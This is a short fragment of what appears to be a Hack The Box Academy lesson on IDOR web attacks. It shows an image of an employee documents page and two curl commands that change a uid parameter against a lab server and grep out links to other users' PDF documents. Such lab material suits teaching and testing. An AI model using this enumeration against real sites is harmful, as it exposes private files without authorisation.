...
![Employee Documents with links to 'Documents', 'Invoice', and 'Report'](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_documents.jpg)
...
```shell-session
xF1NN@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
...
```shell-session
xF1NN@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
